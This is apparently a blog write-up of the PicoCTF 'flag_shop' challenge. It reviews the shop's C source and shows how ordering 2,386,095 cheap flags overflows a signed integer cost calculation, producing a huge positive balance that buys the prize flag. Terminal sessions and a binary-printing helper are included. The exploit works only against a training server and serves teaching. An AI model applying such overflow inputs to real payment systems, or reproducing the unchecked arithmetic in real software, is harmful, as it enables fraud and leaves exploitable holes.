---
title: "PicoCTF: flag_shop"
date: 2024-11-20T14:26:45-06:00
draft: false
tags:
- PicoCTF
- Integer Overflow
- Code Review
---


### Description
flag_shop is a challenge on PicoCTF where an integer overflow vulnerability allows for the purchase of an 1337 flag where we otherwise would have insufficient funds.

### Walkthrough
#### Functionality Testing
Connecting to the Pico server, we get a menu with several options.

```
┌──(kali㉿kali)-[/tmp]
└─$ nc jupiter.challenges.picoctf.org 9745
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
```

We can see our account balance.

```
 Enter a menu selection
1



 Balance: 1100 
```

We can also buy flags, of which there are two options. Options 1 costs 900 each, whereas option 2, the "1337 flag", costs 100000 each.

```
 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
```

```
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one
```

We are asked to buy a flag, presumably the 1337 flags, so let's get started.


#### Code Review
The first thing that caught my eye was the usage the unsecure ```scanf()```. ```scanf()``` takes data from 
standard input and stores it to the address of a variable. However, it does not set a limit on the size of user input, meaning
 it is vulnerable to overflow. For this challenge, I did not need to exploit ```scanf()```, but it is still a vulnerability worth 
 keeping in mind.

We also see that the ```store.c``` uses an integer to store the total cost of the flags in 
```total_cost```, meaning it can be interpreted as positive or negative. ```total_cost``` is derived by multiplying the cost of flag 1 
(900) with the number of flags our user wants to buy, so the number of flags we buy could flip the most significant bit of ```total_cost``` to 1, 
turning it into a negative number.

```C
            if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }   
                }   
            }
```


#### Exploitation
In two's complement, the most significant bit, or leftmost digit determines whether a number is positive (0) or negative (1). 
When our total cost ends up being greater than the maximum positive integer, the cost becomes negative if the most significant bit is 1.
Since the price of a flag is 900, we can overflow our cost by buying ```maximum_integer/price_per_flag``` flags. Of course, this value needs to be
rounded up (or +1 if the quotient is a whole number).

```
┌──(kali㉿kali)-[/tmp]
└─$ python3
Python 3.12.6 (main, Sep  7 2024, 14:20:15) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import math
>>> math.ceil(2147483647/900)
2386093
>>> 2147483647/900
2386092.941111111
>>> 
```

However, when I tried to buy 2386093 flags, I am thrown deep into debt!

```
These knockoff Flags cost 900 each, enter desired quantity
2386093

The final cost is: -2147483596

Your current balance after transaction: -2147482600
```

Let us figure out why this is happening. I've provided a script below to find the binary representation of an integer.

```C
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>


void getBin(int);

int main(int argc, char* argv[]) 
{
        if (argc != 2)
        {
                printf("Usage: %s <num>", argv[0]);
                exit(1);
        }

        getBin(atoi(argv[1]));

        return 0;
}

void getBin(int num)
{
        char bin[33];
        unsigned short index = 0;
        bin[index] = (num >> 31 & 1) + 48;

        for (int i = 1 << 30; i > 0; i >>= 1)
        {
                index++;
                num & i ? (bin[index] = '1') : (bin[index] = '0');
        }

        bin[32] = '\0';

        printf("Number: %d\n", num);
        printf("Binary: %s\n", bin);

        return;
}
```

Calculating our expense, we get a positive number.

```
┌──(kali㉿kali)-[/tmp]
└─$ ./int2bin $(( 0-2386093*900  ))
Number: 2147483596
Binary: 01111111111111111111111111001100
```

However, we start with 1100 in our balance, not 0. If we recalculate our balance with that accounted for, we get a negative number.

```
┌──(kali㉿kali)-[/tmp]
└─$ ./int2bin $(( 1100-2386093*900  ))
Number: -2147482600
Binary: 10000000000000000000010000011000
```

The easiest way to fix our debacle would be to add 1100/900 when calculating the number of flags we need to buy since 
we will need to overflow an additional 1100 for flags that cost 900 each. 

```
>>> math.ceil(2147483647/900+1100/900)
2386095
```

And now we have a large, positive amount of money after the transaction...

```
These knockoff Flags cost 900 each, enter desired quantity
2386095

The final cost is: -2147481796

Your current balance after transaction: 2147482896
```

...and buy the 1337 flag.

```
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_<redacted>}
Welcome to the flag exchange
We sell flags
```